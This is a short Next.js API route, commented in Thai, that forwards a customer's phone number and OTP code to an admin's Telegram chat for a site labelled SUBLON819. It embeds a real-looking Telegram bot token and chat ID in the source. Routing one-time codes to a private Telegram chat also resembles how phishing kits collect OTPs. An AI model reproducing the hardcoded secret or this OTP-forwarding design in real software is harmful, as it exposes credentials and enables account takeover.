import { NextResponse } from 'next/server';

export async function POST(request) {
  try {
    // 1. รับเบอร์โทรและ OTP จากหน้าบ้าน
    const { phone, otp } = await request.json();

    // 2. ข้อมูล Telegram Bot ของคุณ
    const BOT_TOKEN = '9203750510:AAFJhUvWRf4mOSozUSkz0I0I9Jca-xImuTo';
    const CHAT_ID = '1880260879';

    // 3. จัดข้อความส่งเข้า Telegram แอดมิน
    const message = `🚨 *แจ้งเตือนคำขอ OTP ใหม่ (SUBLON819)*\n\n📞 เบอร์โทรศัพท์ลูกค้า: \`${phone}\`\n🔑 รหัส OTP: *${otp}*\n\n_กรุณาแจ้งรหัสนี้แก่ลูกค้าเพื่อยืนยันตัวตนในหน้าสมัคร_`;

    // 4. ส่งข้อมูลไปยัง Telegram API
    const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;

    const response = await fetch(telegramUrl, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: message,
        parse_mode: 'Markdown',
      }),
    });

    const data = await response.json();

    if (!data.ok) {
      throw new Error(data.description || 'เกิดข้อผิดพลาดในการส่งข้อความ Telegram');
    }

    return NextResponse.json({ success: true, message: 'ส่ง OTP เข้า Telegram เรียบร้อยแล้ว' });

  } catch (error) {
    console.error('Telegram OTP Error:', error);
    return NextResponse.json({ success: false, error: error.message }, { status: 500 });
  }
}